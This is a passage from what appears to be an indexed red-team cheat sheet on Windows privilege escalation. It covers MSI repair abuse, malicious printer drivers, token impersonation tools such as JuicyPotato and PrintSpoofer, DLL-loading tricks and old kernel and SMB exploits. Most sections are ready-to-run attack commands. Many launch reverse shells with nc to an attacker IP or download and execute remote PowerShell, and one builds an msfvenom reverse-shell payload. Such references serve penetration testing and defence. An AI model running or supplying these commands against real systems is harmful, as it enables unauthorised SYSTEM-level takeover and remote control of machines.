<p>Enumerate products on the machine</p> <pre><code>wmic product get identifyingnumber,name,vendor,version\n</code></pre> <p>Execute the repair process with the <code>/fa</code> parameter to trigger the CustomActions.  We can use both IdentifyingNumber <code>{E0F1535A-8414-5EF1-A1DD-E17EDCDC63F1}</code> or path to the installer <code>c:\\windows\\installer\\XXXXXXX.msi</code>. The repair will run with the NT SYSTEM account.</p> <pre><code>$installed = Get-WmiObject Win32_Product\n$string= $installed | select-string -pattern \"PRODUCTNAME\"\n$string[0] -match '{\\w{8}-\\w{4}-\\w{4}-\\w{4}-\\w{12}}'\nStart-Process -FilePath \"msiexec.exe\" -ArgumentList \"/fa $($matches[0])\"\n</code></pre> <p>Common mistakes in MSI installers:</p> <ul> <li>Missing quiet parameters: it will spawn <code>conhost.exe</code> as <code>NT SYSTEM</code>. Use <code>[CTRL]+[A]</code> to select some text in it, it will pause the execution.<ul> <li>conhost -&gt; properties -&gt; \"legacy console mode\" Link -&gt; Internet Explorer -&gt; CTRL+O \u2013&gt; cmd.exe</li> </ul> </li> <li>GUI with direct actions: open a URL and start the browser then use the same scenario.</li> <li>Binaries/Scripts loaded from user writable paths: you might need to win the race condition.</li> <li>DLL hijacking/search order abusing</li> <li>PowerShell <code>-NoProfile</code> missing: Add custom commands into your profile     <pre><code>new-item -Path $PROFILE -Type file -Force\necho \"Start-Process -FilePath cmd.exe -Wait;\" &gt; $PROFILE\n</code></pre></li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-insecure-gui-apps","title":"EoP - Insecure GUI apps","text":"<p>Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.</p> <p>Example: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\"</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-evaluating-vulnerable-drivers","title":"EoP - Evaluating Vulnerable Drivers","text":"<p>Look for vuln drivers loaded, we often don't spend enough time looking at this:</p> <ul> <li>Living Off The Land Drivers is a curated list of Windows drivers used by adversaries to bypass security controls and carry out attacks. The project helps security professionals stay informed and mitigate potential threats.</li> <li>Native binary: DriverQuery.exe     <pre><code>PS C:\\Users\\Swissky&gt; driverquery.exe /fo table /si\nModule Name  Display Name           Driver Type   Link Date\n============ ====================== ============= ======================\n1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM\n3ware        3ware                  Kernel        5/18/2015 6:28:03 PM\nACPI         Microsoft ACPI Driver  Kernel        12/9/1975 6:17:08 AM\nAcpiDev      ACPI Devices driver    Kernel        12/7/1993 6:22:19 AM\nacpiex       Microsoft ACPIEx Drive Kernel        3/1/2087 8:53:50 AM\nacpipagr     ACPI Processor Aggrega Kernel        1/24/2081 8:36:36 AM\nAcpiPmi      ACPI Power Meter Drive Kernel        11/19/2006 9:20:15 PM\nacpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM\nADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM\n&lt;SNIP&gt;\n</code></pre></li> <li>matterpreter/OffensiveCSharp/DriverQuery <pre><code>PS C:\\Users\\Swissky&gt; DriverQuery.exe --no-msft\n[+] Enumerating driver services...\n[+] Checking file signatures...\nCitrix USB Filter Driver\n    Service Name: ctxusbm\n    Path: C:\\Windows\\system32\\DRIVERS\\ctxusbm.sys\n    Version: 14.11.0.138\n    Creation Time (UTC): 17/05/2018 01:20:50\n    Cert Issuer: CN=Symantec Class 3 SHA256 Code Signing CA, OU=Symantec Trust Network, O=Symantec Corporation, C=US\n    Signer: CN=\"Citrix Systems, Inc.\", OU=XenApp(ClientSHA256), O=\"Citrix Systems, Inc.\", L=Fort Lauderdale, S=Florida, C=US\n&lt;SNIP&gt;\n</code></pre></li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-printers","title":"EoP - Printers","text":""},{"location":"redteam/escalation/windows-privilege-escalation/#universal-printer","title":"Universal Printer","text":"<p>Create a Printer</p> <pre><code>$printerName     = 'Universal Priv Printer'\n$system32        = $env:systemroot + '\\system32'\n$drivers         = $system32 + '\\spool\\drivers'\n$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\' + $printerName\n\nCopy-Item -Force -Path ($system32 + '\\mscms.dll')             -Destination ($system32 + '\\mimispool.dll')\nCopy-Item -Force -Path '.\\mimikatz_trunk\\x64\\mimispool.dll'   -Destination ($drivers  + '\\x64\\3\\mimispool.dll')\nCopy-Item -Force -Path '.\\mimikatz_trunk\\win32\\mimispool.dll' -Destination ($drivers  + '\\W32X86\\3\\mimispool.dll')\n\nAdd-PrinterDriver -Name       'Generic / Text Only'\nAdd-Printer       -DriverName 'Generic / Text Only' -Name $printerName -PortName 'FILE:' -Shared\n\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles')        | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\\3'           | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\\3'        | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null\nNew-Item         -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null\nNew-ItemProperty -Path ($RegStartPrinter + '\\CopyFiles\\Mango')  -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null\n</code></pre> <p>Execute the driver</p> <pre><code>$serverName  = 'dc.purple.lab'\n$printerName = 'Universal Priv Printer'\n$fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nRemove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue\nAdd-Printer -ConnectionName $fullprinterName\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#printernightmare","title":"PrinterNightmare","text":"<pre><code>git clone https://github.com/Flangvik/DeployPrinterNightmare\nPS C:\\adversary&gt; FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell\n[&lt;3] @Flangvik - TrustedSec\n[+] Copying C:\\Windows\\system32\\mscms.dll to C:\\Windows\\system32\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 64mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\x64\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Copying 32mimispool.dll to C:\\Windows\\system32\\spool\\drivers\\W32X86\\3\\6cfbaf26f4c64131896df8a522546e9c.dll\n[+] Adding printer driver =&gt; Generic / Text Only!\n[+] Adding printer =&gt; EasySystemShell!\n[+] Setting 64-bit Registry key\n[+] Setting 32-bit Registry key\n[+] Setting '*' Registry key\n</code></pre> <pre><code>PS C:\\target&gt; $serverName  = 'printer-installed-host'\nPS C:\\target&gt; $printerName = 'EasySystemShell'\nPS C:\\target&gt; $fullprinterName = '\\\\' + $serverName + '\\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})\nPS C:\\target&gt; Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue\nPS C:\\target&gt; Add-Printer -ConnectionName $fullprinterName\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#bring-your-own-vulnerability","title":"Bring Your Own Vulnerability","text":"<p>Concealed Position : https://github.com/jacob-baines/concealed_position</p> <ul> <li>ACIDDAMAGE - CVE-2021-35449 - Lexmark Universal Print Driver LPE</li> <li>RADIANTDAMAGE - CVE-2021-38085 - Canon TR150 Print Driver LPE</li> <li>POISONDAMAGE - CVE-2019-19363 - Ricoh PCL6 Print Driver LPE</li> <li>SLASHINGDAMAGE - CVE-2020-1300 - Windows Print Spooler LPE</li> </ul> <pre><code>cp_server.exe -e ACIDDAMAGE\n# Get-Printer\n# Set the \"Advanced Sharing Settings\" -&gt; \"Turn off password protected sharing\"\ncp_client.exe -r 10.0.0.9 -n ACIDDAMAGE -e ACIDDAMAGE\ncp_client.exe -l -e ACIDDAMAGE\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-runas","title":"EoP - Runas","text":"<p>Use the <code>cmdkey</code> to list the stored credentials on the machine.</p> <pre><code>cmdkey /list\nCurrently stored credentials:\n Target: Domain:interactive=WORKGROUP\\Administrator\n Type: Domain Password\n User: WORKGROUP\\Administrator\n</code></pre> <p>Then you can use <code>runas</code> with the <code>/savecred</code> options in order to use the saved credentials.  The following example is calling a remote binary via an SMB share. <pre><code>runas /savecred /user:WORKGROUP\\Administrator \"\\\\10.XXX.XXX.XXX\\SHARE\\evil.exe\"\nrunas /savecred /user:Administrator \"cmd.exe /k whoami\"\n</code></pre></p> <p>Using <code>runas</code> with a provided set of credential.</p> <pre><code>C:\\Windows\\System32\\runas.exe /env /noprofile /user:&lt;username&gt; &lt;password&gt; \"c:\\users\\Public\\nc.exe -nc &lt;attacker-ip&gt; 4444 -e cmd.exe\"\n</code></pre> <pre><code>$secpasswd = ConvertTo-SecureString \"&lt;password&gt;\" -AsPlainText -Force\n$mycreds = New-Object System.Management.Automation.PSCredential (\"&lt;user&gt;\", $secpasswd)\n$computer = \"&lt;hostname&gt;\"\n[System.Diagnostics.Process]::Start(\"C:\\users\\public\\nc.exe\",\"&lt;attacker_ip&gt; 4444 -e cmd.exe\", $mycreds.Username, $mycreds.Password, $computer)\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-abusing-shadow-copies","title":"EoP - Abusing Shadow Copies","text":"<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Privilege Escalation.</p> <pre><code># List shadow copies using vssadmin (Needs Admnistrator Access)\nvssadmin list shadows\n\n# List shadow copies using diskshadow\ndiskshadow list shadows all\n\n# Make a symlink to the shadow copy and access it\nmklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-from-local-administrator-to-nt-system","title":"EoP - From local administrator to NT SYSTEM","text":"<pre><code>PsExec.exe -i -s cmd.exe\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-living-off-the-land-binaries-and-scripts","title":"EoP - Living Off The Land Binaries and Scripts","text":"<p>Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/</p> <p>The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.</p> <p>A LOLBin/Lib/Script must:</p> <ul> <li>Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft. Have extra \"unexpected\" functionality. It is not interesting to document intended use cases. Exceptions are application whitelisting bypasses</li> <li>Have functionality that would be useful to an APT or red team</li> </ul> <pre><code>wmic.exe process call create calc\nregsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll\nMicrosoft.Workflow.Compiler.exe tests.xml results.xml\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges","title":"EoP - Impersonation Privileges","text":"<p>Full privileges cheatsheet at https://github.com/gtworek/Priv2Admin, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.</p> Privilege Impact Tool Execution path Remarks <code>SeAssignPrimaryToken</code> Admin 3rd party tool \"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe\" Thank you Aur\u00e9lien Chalot for the update. I will try to re-phrase it to something more recipe-like soon. <code>SeBackup</code> Threat Built-in commands Read sensitve files with <code>robocopy /b</code> - May be more interesting if you can read %WINDIR%\\MEMORY.DMP - <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files. - Robocopy requires both SeBackup and SeRestore to work with /b parameter. <code>SeCreateToken</code> Admin 3rd party tool Create arbitrary token including local admin rights with <code>NtCreateToken</code>. <code>SeDebug</code> Admin PowerShell Duplicate the <code>lsass.exe</code> token. Script to be found at FuzzySecurity <code>SeLoadDriver</code> Admin 3rd party tool 1. Load buggy kernel driver such as <code>szkg64.sys</code> or <code>capcom.sys</code>2. Exploit the driver vulnerability  Alternatively, the privilege may be used to unload security-related drivers with <code>ftlMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code> 1. The <code>szkg64</code> vulnerability is listed as CVE-2018-157322. The <code>szkg64</code> exploit code was created by Parvez Anwar <code>SeRestore</code> Admin PowerShell 1. Launch PowerShell/ISE with the SeRestore privilege present.2. Enable the privilege with Enable-SeRestorePrivilege).3. Rename utilman.exe to utilman.old4. Rename cmd.exe to utilman.exe5. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. <code>SeTakeOwnership</code> Admin Built-in commands 1. <code>takeown.exe /f \"%windir%\\system32\"</code>2. <code>icalcs.exe \"%windir%\\system32\" /grant \"%username%\":F</code>3. Rename cmd.exe to utilman.exe4. Lock the console and press Win+U Attack may be detected by some AV software. Alternative method relies on replacing service binaries stored in \"Program Files\" using the same privilege. <code>SeTcb</code> Admin 3rd party tool Manipulate tokens to have local admin rights included. May require SeImpersonate. To be verified."},{"location":"redteam/escalation/windows-privilege-escalation/#restore-a-service-accounts-privileges","title":"Restore A Service Account's Privileges","text":"<p>This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.</p> <pre><code># https://github.com/itm4n/FullPowers\n\nc:\\TOOLS&gt;FullPowers\n[+] Started dummy thread with id 9976\n[+] Successfully created scheduled task.\n[+] Got new token! Privilege count: 7\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.19041.84]\n(c) 2019 Microsoft Corporation. All rights reserved.\n\nC:\\WINDOWS\\system32&gt;whoami /priv\nPRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeAssignPrimaryTokenPrivilege Replace a process level token             Enabled\nSeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled\nSeAuditPrivilege              Generate security audits                  Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking                  Enabled\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled\nSeCreateGlobalPrivilege       Create global objects                     Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set            Enabled\n\nc:\\TOOLS&gt;FullPowers -c \"C:\\TOOLS\\nc64.exe 1.2.3.4 1337 -e cmd\" -z\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#meterpreter-getsystem-and-alternatives","title":"Meterpreter getsystem and alternatives","text":"<pre><code>meterpreter&gt; getsystem \nTokenvator.exe getsystem cmd.exe \nincognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe \npsexec -s -i cmd.exe \npython getsystem.py # from https://github.com/sailay1996/tokenx_privEsc\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#rottenpotato-token-impersonation","title":"RottenPotato (Token Impersonation)","text":"<ul> <li>Binary available at : foxglovesec/RottenPotato and breenmachine/RottenPotatoNG</li> <li>Exploit using Metasploit with <code>incognito mode</code> loaded.     <pre><code>getuid\ngetprivs\nuse incognito\nlist\\_tokens -u\ncd c:\\temp\\\nexecute -Hc -f ./rot.exe\nimpersonate\\_token \"NT AUTHORITY\\SYSTEM\"\n</code></pre></li> </ul> <pre><code>Invoke-TokenManipulation -ImpersonateUser -Username \"lab\\domainadminuser\"\nInvoke-TokenManipulation -ImpersonateUser -Username \"NT AUTHORITY\\SYSTEM\"\nGet-Process wininit | Invoke-TokenManipulation -CreateProcess \"Powershell.exe -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\\\"};\"\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#juicy-potato-abusing-the-golden-privileges","title":"Juicy Potato (Abusing the golden privileges)","text":"<p>If the machine is &gt;= Windows 10 1809 &amp; Windows Server 2019 - Try Rogue Potato  If the machine is &lt; Windows 10 1809 &lt; Windows Server 2019 - Try Juicy Potato</p> <ul> <li> <p>Binary available at : ohpe/juicy-potato </p> </li> <li> <p>Check the privileges of the service account, you should look for SeImpersonate and/or SeAssignPrimaryToken (Impersonate a client after authentication)</p> <pre><code>whoami /priv\n</code></pre> </li> <li> <p>Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object</p> <ul> <li>Windows 7 Enterprise </li> <li>Windows 8.1 Enterprise</li> <li>Windows 10 Enterprise</li> <li>Windows 10 Professional</li> <li>Windows Server 2008 R2 Enterprise </li> <li>Windows Server 2012 Datacenter</li> <li>Windows Server 2016 Standard </li> </ul> </li> <li> <p>Execute JuicyPotato to run a privileged command.</p> <pre><code>JuicyPotato.exe -l 9999 -p c:\\interpub\\wwwroot\\upload\\nc.exe -a \"IP PORT -e cmd.exe\" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}\nJuicyPotato.exe -l 1340 -p C:\\users\\User\\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}\nJuicyPotato.exe -l 1337 -p c:\\Windows\\System32\\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a \"/c c:\\users\\User\\reverse_shell.exe\"\n    Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337\n    ......\n    [+] authresult 0\n    {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\\SYSTEM\n    [+] CreateProcessWithTokenW OK\n</code></pre> </li> </ul>"},{"location":"redteam/escalation/windows-privilege-escalation/#rogue-potato-fake-oxid-resolver","title":"Rogue Potato (Fake OXID Resolver)","text":"<ul> <li>Binary available at antonioCoco/RoguePotato</li> </ul> <pre><code># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port\nsocat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999\n\n# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. \n# Use this if you have fw restrictions.\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\"\n\n# RoguePotato all in one with RogueOxidResolver running locally on port 9999\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999\n\n#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename\nRoguePotato.exe -r 10.0.0.3 -e \"C:\\windows\\system32\\cmd.exe\" -l 9999 -c \"{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}\" -p splintercode\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#efspotato-ms-efsr-efsrpcopenfileraw","title":"EFSPotato (MS-EFSR EfsRpcOpenFileRaw)","text":"<ul> <li>Binary available at https://github.com/zcgonvh/EfsPotato</li> </ul> <pre><code># .NET 4.x\ncsc EfsPotato.cs\ncsc /platform:x86 EfsPotato.cs\n\n# .NET 2.0/3.5\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe EfsPotato.cs\nC:\\Windows\\Microsoft.Net\\Framework\\V3.5\\csc.exe /platform:x86 EfsPotato.cs\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#juicypotatong","title":"JuicyPotatoNG","text":"<ul> <li>antonioCoco/JuicyPotatoNG</li> </ul> <pre><code>JuicyPotatoNG.exe -t * -p \"C:\\Windows\\System32\\cmd.exe\" -a \"/c whoami\" &gt; C:\\juicypotatong.txt\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#printspoofer-printer-bug","title":"PrintSpoofer (Printer Bug)","text":"<p>this work if SeImpersonatePrivilege is enabled</p> <ul> <li>Binary available at https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0</li> </ul> <pre><code># run nc -lnvp 443 then :\n.\\PrintSpoofer64.exe -c \"C:\\Temp\\nc64.exe 192.168.45.171 443 -e cmd\"\n# without listener\n.\\PrintSpoofer64.exe -i -c cmd\n# Via RPD\n.\\PrintSpoofer64.exe -d 3 -c \"powershell -ep bypass\"\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-privileged-file-write","title":"EoP - Privileged File Write","text":""},{"location":"redteam/escalation/windows-privilege-escalation/#diaghub","title":"DiagHub","text":"<p> Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.</p> <p>The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM.  This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the <code>C:\\Windows\\System32</code> directory. </p>"},{"location":"redteam/escalation/windows-privilege-escalation/#exploit","title":"Exploit","text":"<ol> <li>Create an evil DLL e.g: payload.dll and move it into <code>C:\\Windows\\System32</code></li> <li>Build https://github.com/xct/diaghub</li> <li><code>diaghub.exe c:\\\\ProgramData\\\\ payload.dll</code></li> </ol> <p>The default payload will run <code>C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe -lvp 2000 -e cmd.exe</code></p> <p>Alternative tools: * https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag * https://github.com/decoder-it/diaghub_exploit</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#usodllloader","title":"UsoDLLLoader","text":"<p> 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.</p> <p>An alternative to the DiagHub DLL loading \"exploit\" found by James Forshaw (a.k.a. @tiraniddo)</p> <p>If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of <code>windowscoredeviceinfo.dll</code> into <code>C:\\Windows\\Sytem32\\</code> and then have it loaded by the USO service to get arbitrary code execution as NT AUTHORITY\\System.</p>"},{"location":"redteam/escalation/windows-privilege-escalation/#exploit_1","title":"Exploit","text":"<ol> <li>Build https://github.com/itm4n/UsoDllLoader<ul> <li>Select Release config and x64 architecure.</li> <li>Build solution.<ul> <li>DLL .\\x64\\Release\\WindowsCoreDeviceInfo.dll</li> <li>Loader .\\x64\\Release\\UsoDllLoader.exe.</li> </ul> </li> </ul> </li> <li>Copy <code>WindowsCoreDeviceInfo.dll</code> to <code>C:\\Windows\\System32\\</code></li> <li>Use the loader and wait for the shell or run <code>usoclient StartInteractiveScan</code> and connect to the bind shell on port 1337.</li> </ol>"},{"location":"redteam/escalation/windows-privilege-escalation/#wertrigger","title":"WerTrigger","text":"<p>Exploit Privileged File Writes bugs with Windows Problem Reporting</p> <ol> <li>Clone https://github.com/sailay1996/WerTrigger</li> <li>Copy <code>phoneinfo.dll</code> to <code>C:\\Windows\\System32\\</code></li> <li>Place <code>Report.wer</code> file and <code>WerTrigger.exe</code> in a same directory.</li> <li>Then, run <code>WerTrigger.exe</code>.</li> <li>Enjoy a shell as NT AUTHORITY\\SYSTEM</li> </ol>"},{"location":"redteam/escalation/windows-privilege-escalation/#wermgr","title":"WerMgr","text":"<p>Exploit Privileged Directory Creation Bugs with Windows Error Reporting</p> <ol> <li>Clone https://github.com/binderlabs/DirCreate2System</li> <li>Create directory <code>C:\\Windows\\System32\\wermgr.exe.local\\</code></li> <li>Grant access to it: <code>cacls C:\\Windows\\System32\\wermgr.exe.local /e /g everyone:f</code></li> <li>Place <code>spawn.dll</code> file and <code>dircreate2system.exe</code> in a same directory and run <code>.\\dircreate2system.exe</code>. </li> <li>Enjoy a shell as NT AUTHORITY\\SYSTEM</li> </ol>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-privileged-file-delete","title":"EoP - Privileged File Delete","text":"<p>During an MSI installation, the Windows Installer service maintains a record of every changes in case it needs to be rolled back, to do that it will create:</p> <ul> <li>a folder at <code>C:\\Config.Msi</code> containing <ul> <li>a rollback script (<code>.rbs</code>) </li> <li>a rollback file (<code>.rbf</code>)</li> </ul> </li> </ul> <p>To convert a privileged file delete to a local privilege escalation, you need to abuse the Windows Installer service. * delete the protected <code>C:\\Config.Msi</code> folder immediately after it's created by the Windows Installer * recreate the <code>C:\\Config.Msi</code> folder with weak DACL permissions since ordinary users are allowed to create folders at the root of <code>C:\\</code>. * drop malicious <code>.rbs</code> and <code>.rbf</code> files into it to be executed by the MSI rollback * then upon rollback, Windows Installer will make arbitrary changes to the system</p> <p>The easiest way to trigger this chain is using thezdi/FilesystemEoPs/FolderOrFileDeleteToSystem. The exploit contains a .msi file with 2 actions, the first one produces a delay and the second throws an error to make it rollback. This rollback will \"restore\" a malicious HID.dll in <code>C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll</code>.</p> <p>Then switch to the secure desktop using <code>[CTRL]+[ALT]+[DELETE]</code> and open the On-Screen Keyboard (<code>osk.exe</code>). The <code>osk.exe</code> process first looks for the <code>C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll</code> library instead of <code>C:\\Windows\\System32\\HID.dll</code></p>"},{"location":"redteam/escalation/windows-privilege-escalation/#eop-common-vulnerabilities-and-exposure","title":"EoP - Common Vulnerabilities and Exposure","text":""},{"location":"redteam/escalation/windows-privilege-escalation/#ms08-067-netapi","title":"MS08-067 (NetAPI)","text":"<p>Check the vulnerability with the following nmap script.</p> <pre><code>nmap -Pn -p445\u200a--open\u200a--max-hostgroup 3\u200a--script smb-vuln-ms08-067 &lt;ip_netblock&gt;\n</code></pre> <p>Metasploit modules to exploit <code>MS08-067 NetAPI</code>.</p> <pre><code>exploit/windows/smb/ms08_067_netapi\n</code></pre> <p>If you can't use Metasploit and only want a reverse shell.</p> <pre><code>https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py\nmsfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread -b \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\" -f py -v shellcode -a x86 --platform windows\n\nExample: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445\nExample: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)\nExample: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal\nExample: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English\nExample: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)\nExample: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)\nExample: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)\npython ms08-067.py 10.0.0.1 6 445\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#ms10-015-kitrap0d-microsoft-windows-nt200020032008xpvista7","title":"MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7","text":"<p>'KiTrap0D' User Mode to Ring Escalation (MS10-015)</p> <pre><code>https://www.exploit-db.com/exploits/11199\n\nMetasploit : exploit/windows/local/ms10_015_kitrap0d\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#ms11-080-afdsys-microsoft-windows-xp2003","title":"MS11-080 (afd.sys) - Microsoft Windows XP/2003","text":"<pre><code>Python: https://www.exploit-db.com/exploits/18176\nMetasploit: exploit/windows/local/ms11_080_afdjoinleaf\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#ms15-051-client-copy-image-microsoft-windows-20032008782012","title":"MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012","text":"<pre><code>printf(\"[#] usage: ms15-051 command \\n\");\nprintf(\"[#] eg: ms15-051 \\\"whoami /all\\\" \\n\");\n\n# x32\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/Win32/ms15-051.exe\n\n# x64\nhttps://github.com/rootphantomer/exp/raw/master/ms15-051%EF%BC%88%E4%BF%AE%E6%94%B9%E7%89%88%EF%BC%89/ms15-051/ms15-051/x64/ms15-051.exe\n\nhttps://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051\nuse exploit/windows/local/ms15_051_client_copy_image\n</code></pre>"},{"location":"redteam/escalation/windows-privilege-escalation/#ms16-032-microsoft-windows-7-10-2008-2012-r2-x86x64","title":"MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)","text":"<p>Check if the patch is installed : <code>wmic qfe list | findstr \"3139914\"</code></p> <pre><code>Powershell:\nhttps://www.exploit-db.com/exploits/39719/\nhttps://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1\n\nBinary exe : https://github.com/Meatballs1/ms16-032\n\nMetasploit : 